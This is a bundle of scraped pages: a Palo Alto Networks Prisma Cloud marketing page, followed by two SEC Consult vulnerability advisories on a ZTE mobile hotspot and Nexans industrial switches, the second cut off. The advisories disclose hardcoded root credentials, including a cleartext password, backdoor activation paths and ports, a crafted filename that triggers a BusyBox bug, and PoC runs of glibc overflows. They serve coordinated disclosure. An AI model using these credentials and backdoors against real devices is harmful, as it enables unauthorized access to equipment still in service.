[Meet the Prisma Cloud Copilot](https://bcove.video/3yirjPK) ![Atlantic Logo](/content/dam/pan/en_US/images/cnapp-24/global_atlantic_logo.png)![Fortune 500 Logo](/content/dam/pan/en_US/images/cnapp-24/fortune_500_logo.png)![Pexa Logo](/content/dam/pan/en_US/images/cnapp-24/pexa_logo_resize.png)![Atlantic Logo](/content/dam/pan/en_US/images/cnapp-24/global_atlantic_logo.png)![Fortune 500 Logo](/content/dam/pan/en_US/images/cnapp-24/fortune_500_logo.png)![Pexa Logo](/content/dam/pan/en_US/images/cnapp-24/pexa_logo_resize.png)
## See how customers are putting our trusted, AI-powered platform to work.

 [See all customer stories](/prisma/cloud/customer-stories)
### 01Global Atlantic Financial group

![Global Atlantic Financial group]()play video

This leading U.S. financial group used Prisma Cloud to consolidate visibility in their diverse multicloud environment.

[Read the full story](/customers/global-atlantic-financial-group-shifts-left-by-integrating-security-into-the-development-process)

“Prisma Cloud empowers our organization to seamlessly scale with an array of cloud-native capabilities to maintain a formidable cybersecurity posture.”

Chris Bogaards, AVP, IT Information Security

[Read the full story](/customers/global-atlantic-financial-group-shifts-left-by-integrating-security-into-the-development-process)
### 02Fortune 500

#### Securing the online retailer of the future with Prisma Cloud.

“Retail is a race, and we need to be more agile than our competitors. We needed an integrated, best-in-class solution for securing any type of cloud-native workload throughout the development lifecycle.”

European multichannel retailer

#### Securing the online retailer of the future with Prisma Cloud.

“Retail is a race, and we need to be more agile than our competitors. We needed an integrated, best-in-class solution for securing any type of cloud-native workload throughout the development lifecycle.”

European multichannel retailer

* 35%

  faster time to patch vulnerabilities
* 90%

  reduction in management overhead
* 0

  cloud breaches in runtime

[Read the full story](/customers/securing-the-online-retailer-of-the-future-with-prisma-cloud-compute) ![Fortune 500]()
### 03Pexa Icon

#### PEXA (Property Exchange Australia) relies on Prisma Cloud for timely threat detection and comprehensive coverage across their cloud platform.

#### PEXA (Property Exchange Australia) relies on Prisma Cloud for timely threat detection and comprehensive coverage across their cloud platform.

* 89%

  market reach
* 40

  upstream providers
* 4x

  increase in footprint since day one

[Read the full story](/customers/pexa-relies-on-prisma-cloud-for-timely-threat-detection-and-mitigation) ![Pexa Icon]()
## Industry recognized. Constantly innovating.

### 9x Cloud Security Leaderopen

#### GigaOm Logo GigaOm Radar for CNAPPs

#### Forrester Logo Forrester Wave: Cloud Workload Security

#### Frost & Sullivan Logo Frost & Sullivan CNAPP Radar

#### GigaOm Logo GigaOm Radar for Policy as Code

#### GigaOm Logo GigaOm Radar for Cloud Infrastructure Entitlement Management

#### GigaOm Logo GigaOm Radar for CSPM

#### GigaOm Logo GigaOm Radar for Container Security

#### GigaOm Logo GigaOm Radar for Data Security Posture Management

#### GigaOm Logo GigaOm Radar for Software Supply Chain Security

## Secure your network with trusted resources.

[View all](/resources)[ANALYST REPORT
### Forrester Total Economic Impact™ Study Of Prisma Cloud

![Forrester Total Economic Impact™ Study Of Prisma Cloud]()](/prisma/forrester-tei-study-prisma-cloud)[GUIDE
### Securing the Data Landscape with DSPM and DDR

![Securing the Data Landscape with DSPM and DDR]()](/resources/guides/dspm-ddr-big-guide)[WEBINAR
### Protecting Data and AI in 2024: What CISOs Need to Know

![Protecting Data and AI in 2024]()](https://start.paloaltonetworks.com/PrismaCloud-DSPM-on-demand-Webinar-Protecting-Data-and-AI-in-2024-What-CISOs-Need-to-Know.html)[RESEARCH REPORT
### The State of Cloud-Native Security Report

![The State of Cloud-Native Security Report]()](/state-of-cloud-native-security)PrevNext
## Ready to meet youwhere you are.

Executives
Specialists
Partners
Customers
![Ignite on tour logo]()
### Ignite on Tour

Meet decision makers, experts and practitioners for a day of hands-on learning, strategy building and networking.

[Attend our global roadshow](https://register.paloaltonetworks.com/igniteontour)![man coding]()
### Under Attack? We’re Here.

Unit 42® Incident Response explains the breach, works with you to contain and remedy it, and gets you back to business.

[Our experts are standing by](https://start.paloaltonetworks.com/contact-unit42.html)![Executives in board room]()
### Executive Briefing Center

Get a customized plan to see how our platforms, threat intelligence and expert services help you secure the way forward.

[Plan a collaborative discussion](/about-us/executive-briefing-program)![woman on laptop]()
### Product Demo Center

Visit the demo center to see solution experts walk you through our comprehensive cybersecurity portfolio in action.

[Take our products for a spin](/demos)![specialist]()
### Events Around the World

Browse all scheduled SecOps global events by cybersecurity technology interest, industry, region, use case and more.

[Join us in-person or online](https://events.paloaltonetworks.com/#security-automation-events)![get started]()
#### Future-proof your Security

Meet the trusted, proven and awarded products that make a positive difference in your security and business outcomes.

[Get to know our products](/get-started)![typing on laptop]()
### Partner Portal

Don’t try to tackle security challenges alone. Tap into the world’s most interoperable cloud and AI security platform.

[Log into our partner interface](/partners/nextwave-partner-portal-login)![man thinking]()
### Become a Partner

Be part of a global community of world-class innovators committed to making security breaches a thing of the past.

[Apply to our partner community](https://paloaltonetworks.my.site.com/NextWavePartnerProgram/s/partnerregistration?type=becomepartner)![technicians collaborating]()
### Managed Services Program

Provide managed security services that reduce cost, increase average revenue per customer and maximize market reach.

[Experience specialized tech](/partners/managed-security-services-provider-program)![Customer login]()
### Customer Login

Security, performance and ease of use: Three qualities our customers like most about our cybersecurity products.

[Sign in or create an account](https://support.paloaltonetworks.com/SupportAccount/MyAccount)![Education and training]()
### Education and Training

Expand your wisdom and skills with world-class training, certification and accreditation, including digital learning.

[Learn from security experts](/services/education)![Customer success tools]()
### Customer Success Tools

Guidance, oversight and 24/7 support from cybersecurity experts to help expedite your setup and initial configuration.

[Make the most of our resources](/services/customer-success)
## Get the latest news, invites to events, and threat alerts

Enter your email now to subscribe!Sign up

By submitting this form, you agree to our
[Terms of Use](/legal-notices/terms-of-use)
and acknowledge our
[Privacy Statement](/legal-notices/privacy).

Sign up
## Products and Services

* [Network Security Platform](/network-security)
* [CLOUD DELIVERED SECURITY SERVICES](/network-security/security-subscriptions)
* [Advanced Threat Prevention](/network-security/advanced-threat-prevention)
* [Advanced WildFire](/network-security/advanced-wildfire)
* [DNS Security](/network-security/advanced-dns-security)
* [Data Loss Prevention](/network-security/enterprise-data-loss-prevention)
* [IoT Security](/network-security/enterprise-iot-security)
* [Next-Generation Firewalls](/network-security/next-generation-firewall)
* [Hardware Firewalls](/network-security/next-generation-firewall-hardware)
* [Strata Cloud Manager](/network-security/strata-cloud-manager)
* [SECURE ACCESS SERVICE EDGE](/sase)
* [Prisma Access](/sase/access)
* [Prisma SD-WAN](/sase/sd-wan)
* [Autonomous Digital Experience Management](/sase/adem)
* [Cloud Access Security Broker](/sase/next-gen-casb)
* [Zero Trust Network Access](/sase/ztna)

* [Code to Cloud Platform](/prisma/whyprisma)
* [Prisma Cloud](/prisma/cloud)

* [AI-Driven Security Operations Platform](/cortex)
* [Cortex XDR](/cortex/cortex-xdr)
* [Cortex XSOAR](/cortex/cortex-xsoar)
* [Cortex Xpanse](/cortex/cortex-xpanse)
* [Cortex XSIAM](/cortex/cortex-xsiam)
* [External Attack Surface Protection](/cortex/cortex-xpanse/attack-surface-management)
* [Security Automation](/cortex/security-operations-automation)
* [Threat Prevention, Detection & Response](/cortex/detection-and-response)

* [Threat Intel and Incident Response Services](/unit42)
* [Proactive Assessments](/unit42/assess)
* [Incident Response](/unit42/respond)
* [Transform Your Security Strategy](/unit42/transform)
* [Discover Threat Intelligence](/unit42/threat-intelligence-partners)
## Company

* [About Us](/about-us)
* [Careers](https://jobs.paloaltonetworks.com/en/)
* [Contact Us](/company/contact-sales)
* [Corporate Responsiblity](/about-us/corporate-responsibility)
* [Customers](/customers)
* [Investor Relations](https://investors.paloaltonetworks.com/)
* [Location](/about-us/locations)
* [Newsroom](/company/newsroom)
## Popular Links

* [Blog](/blog/)
* [Communities](/communities)
* [Content Library](/resources)
* [Cyberpedia](/cyberpedia)
* [Event Center](https://events.paloaltonetworks.com/)
* [Manage Email Preferences](https://start.paloaltonetworks.com/preference-center)
* [Products A-Z](/products/products-a-z)
* [Product Certifications](/legal-notices/trust-center/compliance)
* [Report a Vulnerability](/security-disclosure)
* [Sitemap](/sitemap)
* [Tech Docs](https://docs.paloaltonetworks.com/)
* [Unit 42](https://unit42.paloaltonetworks.com/)
* [Do Not Sell or Share My Personal Information](https://panwedd.exterro.net/portal/dsar.htm?target=panwedd)
![PAN logo]()

* [Privacy](/legal-notices/privacy)
* [Trust Center](/legal-notices/trust-center)
* [Terms of Use](/legal-notices/terms-of-use)
* [Documents](/legal)

Copyright © 2025 Palo Alto Networks. All Rights Reserved

* [![Youtube]()](https://www.youtube.com/user/paloaltonetworks)
* [![Twitter]()](https://twitter.com/PaloAltoNtwks)
* [![Facebook]()](https://www.facebook.com/PaloAltoNetworks/)
* [![LinkedIn]()](https://www.linkedin.com/company/palo-alto-networks)
* [![Podcast]()](https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/)
* ENSelect your language


=== Content from seclists.org_1fb062d1_20250125_072651.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](19)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](19)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20200827-0 :: Multiple Vulnerabilities in ZTE mobile Hotspot MS910S

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 27 Aug 2020 18:04:55 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20200827-0 >
=======================================================================
              title: Multiple Vulnerabilities
            product: ZTE mobile Hotspot MS910S
 vulnerable version: DL_MF910S_CN_EUV1.00.01
      fixed version: -
         CVE number: CVE-2019-3422
             impact: High
           homepage: <https://www.zte.com.cn>
              found: 2019-09-25
                 by: Ying Shen
                     T. Weber (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"ZTE Corporation is a global leader in telecommunications and information
technology. Founded in 1985 and listed on both the Hong Kong and Shenzhen Stock
Exchanges, the company has been committed to providing integrated end-to-end
innovations to deliver excellence and value to consumers, carriers, businesses
and public sector customers from over 160 countries around the world to enable
increased connectivity and productivity."

Source: <https://www.zte.com.cn/global/about/corporate_information>

Business recommendation:
------------------------
The vendor recommends to change the hardware and use a newer product.

SEC Consult recommends to remove the device from productive environments.

Vulnerability overview/description:
-----------------------------------
1) Hard-coded Administrator Password
The hard-coded administrator password was found in the ZTE mobile hotspot
MS910S firmware version "CN_EUV1.00.01", which is available at.
<http://devicedownload.zte.com.cn/support/product/201701161506340/soft/20170116151106465.zip>

2) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.15.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scalable firmware run-time.

3) Known Backdoor in GoAhead Webserver
An unusual "telnetd" port was identified on an emulated device which led to the
assumption that a backdoor can be opened via the GoAhead web-server.
This conclusion was done because of a blog post from another researcher:
<http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html>

By partially reverse engineering the binaries of the GoAhead webserver, the
functionality described in the corresponding blog post can be underpinned.

Proof of concept:
-----------------
1) Hard-coded Administrator Password
The firmware file (ZTE_MF910SV1.0.1B09.bin) is using the JFFS2 filesystem which
was extracted. The hardcoded password can be found in the /etc/shadow file
within the firmware:

/_DL_MF910S_CN_EUV1.00.01.exe.extracted/Data/version/_ZTE_MF910SV1.0.1B09.bin.extracted/jffs2-root/fs_1/etc/shadow

The file content is shown below:
-------------------------------------------------------------------------------
root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
bin::10933:0:99999:7:::
daemon::10933:0:99999:7:::
adm::10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody::10933:0:99999:7:::
ap71::10933:0:99999:7:::
-------------------------------------------------------------------------------
Both the user "root" and "admin" are using the same weak hardcoded password
"5up".

2) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was crea-
ted to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

3) Known Backdoor in GoAhead Webserver
Starting the telnet daemon on the emulated device leads to a listener on a very
unusual port:
[...]
# telnetd
#netstat -tulen
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:4719            0.0.0.0:*               LISTEN
[...]

Because this seems to be not configured on the system by any file, the BusyBox
binary was inspected.

The pseudocode snippet of BusyBox' telnetd function that was generated by Hex-
Rays ARM Decompiler, indicated that this port was hard-coded:
<snip>
dword_788DC = (int)"/bin/login";
  dword_788E0 = (int)"/etc/issue.net";
  v3 = sub_5DBFC(a2, "f:l:Kip:b:F", &dword_788E0, &dword_788DC, &v76, &v75);
  v4 = v3 & 8;
  v5 = v3;
  if ( !(v3 & 8) && !(v3 & 0x40) )
    sub_64A10(v3 & 8);
  if ( (v5 & 0x48) != 64 )
  {
    openlog((const char *)dword_798DC, 1, 24);
    dword_78630 = 2;
  }
  if ( v5 & 0x10 )
    v6 = sub_64FF8(v76);
  else
    v6 = 4719; <------------------------------------- Port "4719"
  if ( !v4 )
  {
    v2 = sub_65578(v75, v6);
    sub_E394(v2, 1);
    sub_D9B0(v2);
    goto LABEL_13;
  }
  dword_788D8 = (int)sub_1C480(0);
  if ( dword_788D8 )
  {
<snip>

This led to the assumption that the GoAhead webserver was modified like
described in the following blog post:
<http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html>

Inspecting the GoAhead webserver binary reinforces this assumption. The
pseudocode was generated with Hex-Rays ARM Decompiler, like for the prior
BusyBox binary:
<snip>
int __fastcall sub_21D48(int a1)
{
  int v1; // r5
  const char *v2; // r4

  v1 = a1;
  cfg_get("debug_level");
  v2 = (const char *)sub_17DF0(v1, "change_mode", "");
  cfg_set("login_9527", "1");
  if ( !strcmp("1", v2) )
  {
    cfg_set("change_mode", "1");
    cfg_get("debug_level");
    system("mode_change 1");
  }
  else if ( !strcmp("2", v2) ) <--- change mode "2"
  {
    cfg_get("debug_level");
    system("telnetd &"); <--------- telnet daemon started
  }
  else if ( !strcmp("3", v2) )
  {
    cfg_get("debug_level");
    system("rem_start.sh &");
  }
  else if ( !strcmp("4", v2) )
  {
    cfg_get("debug_level");
    system("rem_kill.sh &");
  }
  else
  {
    cfg_set("change_mode", "0");
    cfg_get("debug_level");
    system("mode_change 0");
  }
  return sub_34374(v1, "success");
}
<snip>

Other scripts could also be started via the webserver, like "rem_start.sh".
This script contains the following lines:

#!/bin/sh
if ps|grep remserial
then
echo "remserial is running.."
else
remserial -p 10005 -r 192.168.1.10 -s "115200 raw" /dev/ttyUSB0 &
fi

That means, that a serial console with the speed of 115200 Baud on port 10005
is started.

Vulnerable / tested versions:
-----------------------------
The following firmware has been tested, which was the latest version available
during the time of the test:
* DL_MF910S_CN_EUV1.00.01

Vendor contact timeline:
------------------------
2019-09-30: Contacting vendor through psirt () zte com cn
2019-10-10: Vendor provides initial contact.
2019-10-14: Vendor confirmed receive of the advisory.
2019-10-15: ZTE confirmed the hard-coded administrator password issue. The
            GoAhead webserver backdoor is still analyzed.
2019-11-05: ZTE released a Security Bullentin that the product MF910S is
            end-of-service*. SEC Consult Vulnerability Lab added a grace
            time of 9 months so that the hardware can be changed.
2020-08-27: Release of security advisory.

* <http://support.zte.com.cn/support/news/LoopholeInfoDetail.aspx?newsId=1011722>

Solution:
---------
Upgrade to new hardware.

Workaround:
-----------
None.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF Thomas Weber / @2020

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](19)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](19)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

### Current thread:

* **SEC Consult SA-20200827-0 :: Multiple Vulnerabilities in ZTE mobile Hotspot MS910S** *SEC Consult Vulnerability Lab (Aug 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_3e5e7fdd_20250125_072655.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](35)
[By Date](date.html#36)
[![Next](/images/right-icon-16x16.png)](37)

[![Previous](/images/left-icon-16x16.png)](35)
[By Thread](index.html#36)
[![Next](/images/right-icon-16x16.png)](37)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20220615-0 :: Hardcoded Backdoor User and Outdated Software Components in Nexans FTTO GigaSwitch series

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>

*Date*: Wed, 15 Jun 2022 06:55:49 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20220615-0 >
=======================================================================
               title: Hardcoded Backdoor User and Outdated Software Components
             product: Nexans FTTO GigaSwitch industrial/office switches HW version 5
  vulnerable version: See "Vulnerable / tested versions"
       fixed version: V6.02N, V7.02
          CVE number: CVE-2022-32985
              impact: High
            homepage: <https://www.nexans.com/>
               found: 2020-05-25
                  by: T. Weber (Office Vienna)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"As a global player in the cable industry, Nexans is behind the scenes
delivering the innovative services and resilient products that carry thousands
of watts of energy and terabytes of data per second around the world. Millions
of homes, cities, businesses are powered every day by Nexans’ high-quality
sustainable cabling solutions. We help our customers meet the challenges they
face in the fields of energy infrastructure, energy resources, transport,
buildings, telecom and data, providing them with solutions and services for the
most complex cable applications in the most demanding environments."

Source: <https://www.nexans.com/company/What-we-do.html>

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult recommends to perform a thorough security review of these
products conducted by security professionals to identify and resolve all
security issues.

Vulnerability overview/description:
-----------------------------------
1) Outdated Vulnerable Software Components
A static scan with the IoT Inspector (ONEKEY) revealed outdated software packages that
are used in the devices' firmware. Four of them were verified by using the
MEDUSA scalable firmware runtime.

2) Hardcoded Backdoor User (CVE-2022-32985)
A hardcoded root user was found in "/etc/passwd". In combination with the
invoked dropbear SSH daemon in the libnx_apl.so library, it can be used on port
50201 and 50200 to login on a system shell.

Proof of concept:
-----------------
1) Outdated Vulnerable Software Components
Based on an automated scan with the IoT Inspector (ONEKEY) the following third party
software packages were found to be outdated:

Firmware version 6.02L:
BusyBox       1.20.2
Dropbear SSH  2012.55
GNU glibc     2.17
lighttpd      1.4.48
OpenSSL       1.0.2h

The following CVEs were verified with MEDUSA scalable firmware emulation:

* CVE-2015-9261 (Unzip)
The crafted ZIP archive "x_6170921383890712452.bin" was taken from:
<https://www.openwall.com/lists/oss-security/2015/10/25/3>
Execution inside the firmware emulation:

bash-4.2# unzip x_6170921383890712452.bin
Archive:  x_6170921383890712452.bin
   inflating: ]3j½r«IK-%Ix
do_page_fault(): sending SIGSEGV to unzip for invalid read access from 735ededc
epc = 0044bb28 in busybox[400000+99000]
ra  = 0044b968 in busybox[400000+99000]
Segmentation fault

* CVE-2015-0235 (gethostbyname "GHOST" buffer overflow)

PoC code was taken from:
<https://gist.github.com/dweinstein/66e6a088191ac0e8105c>

* CVE-2015-7547 (getaddrinfo buffer overflow)

PoC code was taken from:
<https://github.com/fjserna/CVE-2015-7547>

-bash-4.4# python /medusa_exploits/cve-2015-7547-poc.py &
[1] 259
-bash-4.4# chroot /medusa_rootfs/ bin/bash
bash-4.2# cd /medusa_exploits/
bash-4.2# ./cve-2015-7547_glibc_getaddrinfo
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
Connected with 127.0.0.1:34356
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
[TCP] Request2 len recv 36
Segmentation fault

* CVE-2017-16544 (shell autocompletion vulnerability)

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Hardcoded Backdoor User (CVE-2022-32985)
The hardcoded system user, reachable via the dropbear SSH daemon was found due
to multiple indications on the system. The undocumented root user itself was
contained in the "passwd" file:

Content of the file "/etc/passwd".
-------------------------------------------------------------------------------
root:oFQzvQf5qrI56:0:0:root:/home/root:/bin/sh
[...]
-------------------------------------------------------------------------------

A suspicious port for the SSH daemon was chosen in the config file of dropbear:

Content of the file "/etc/init.d/dropbear":
-------------------------------------------------------------------------------
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/dropbear
NAME=dropbear
DESC="Dropbear SSH server"
PIDFILE=/var/run/dropbear.pid

DROPBEAR_PORT="50200 -p 50201"
[...]
-------------------------------------------------------------------------------

This is invoked from "/usr/lib/libnx_apl.so.0.0.0", which can be seen in the
following pseudo-code:
-------------------------------------------------------------------------------
void dropbear_server_init(char param_1)

{
   __pid_t __pid;
   char *pcVar1;
   int aiStack16 [2];

   __pid = fork();
   if (__pid == 0) {
     __pid = fork();
     if (__pid != 0) {
                     /* WARNING: Subroutine does not return */
       exit(0);
     }
     if (param_1 == '\0') {
       pcVar1 = "/etc/init.d/dropbear stop";
     }
     else {
       pcVar1 = "/etc/init.d/dropbear start";                               <---
     }
     execl("/bin/sh","sh",&DAT_2cd91564,pcVar1,0);
   }
   else {
     waitpid(__pid,aiStack16,0);
   }
   return;
}
-------------------------------------------------------------------------------

This function is called if a specific command is issued in the CLI interface:
-------------------------------------------------------------------------------
[...]
   iVar6 = telnet_cmp_command((char *)(param_3 + 0xf2),"ssh",2);
   if (iVar6 != 0) {
     if (param_2 < 4) {
       netbuf_fwd_sprintf(param_1,"\r\n%%Error: Parameter missing\r\n");
       iVar6 = shared_mem_get_addr(&var_shm);
       iVar7 = shared_mem_get_addr(&var_shm);
       uVar8 = shared_mem_read_u8(&var_shm,iVar7 + 0x161a);
       shared_mem_write_u8(&var_shm,iVar6 + 0x161a,uVar8 & 0xff | 0x10);
       return;
     }
     iVar6 = telnet_cmp_command((char *)(param_3 + 0x16b),"start",1);
     if (iVar6 != 0) {
       dropbear_server_init('\x01');                                        <---
       netbuf_fwd_sprintf(param_1,"Starting dropbear...\r\n");
       return;
     }
     iVar6 = telnet_cmp_command((char *)(param_3 + 0x16b),"stop",1);
     if (iVar6 != 0) {
       dropbear_server_init('\0');                                          <---
       netbuf_fwd_sprintf(param_1,"Stopping dropbear...\r\n");
       return;
     }
     netbuf_fwd_sprintf(param_1,"Uknown dropbear command...\r\n");
     return;
[...]
-------------------------------------------------------------------------------
The mentioned library is used in the CLI program that is running on the device.

Vulnerable / tested versions:
-----------------------------
The following firmware versions have been tested:

* Nexans FTTO GigaSwitch HW Version 5 (all industrial/office switches) / Firmware 6.02L
* Nexans FTTO GigaSwitch HW Version 5 (all industrial/office switches) / Firmware 5.04M

Vendor contact timeline:
------------------------
2020-05-28: Contacting the vendor's PSIRT under the following link:
             <http://www.nexans-ans.de/support/index.php?u=security_portal_sendmail>
                        No answer.
2020-06-08: Contacting vendor again via support.ans () nexans com. Extended
             deadline by 11 days.
2020-06-16: Telephone call with Nexans representative. Security advisory was
             received. It will be reviewed to confirm the found issues.
2020-06-26: Telephone call with Nexans representative. Nexans is working on the
             reported issues and will remove the dropbear daemon as first
             measure.
2020-08-04: Vendor stated that a fix for the outdated software components will
             be available in November.
2020-11-12: Asked for status update.
2020-11-16: Contact stated, that firmware test will need more time. Updates are
             estimated to be ready in Q1 of 2020.
2020-11-20: Vendor confirmed Q1 as estimated disclosure date.
2021-01-21: Asked for status update; Vendor stated that the release with all
             fixes is aimed to be published end of Q1.
2021-03-09: Asked for status update.
2021-03-17: Vendor stated that the firmware is in testing stage. The fixed
             firmware will be released in May.
2021-06-10: Asked for status update.
2021-06-14: Vendor stated that the firmware is not ready due to COVID19 and
             homeschooling. The fixed firmware will be released end of August.
2021-08-31: Asked for status update.
2021-09-07: Vendor stated that the fixed firmware will be ready end of 2021.
2022-05-23: Informed vendor that the advisory will be released mid of June 2022.
2022-05-24: Firmware V7.02 is available for download which fixes most outdated
             components issues.
2022-06-15: Release of security advisory.

Solution:
---------
The vendor provides an updated firmware here:
<https://www.nexans-ans.de/support/firmware/>

Firmware version V6.02N has the backdoor removed and was already published a while ago.
Version V7.02 also has the backdoor removed and most of the outdated software issues.

Workaround:
-----------
None

Advisory URL:
-------------
<https://sec-consult.com/vulnerability-lab/>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult, an Atos company
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

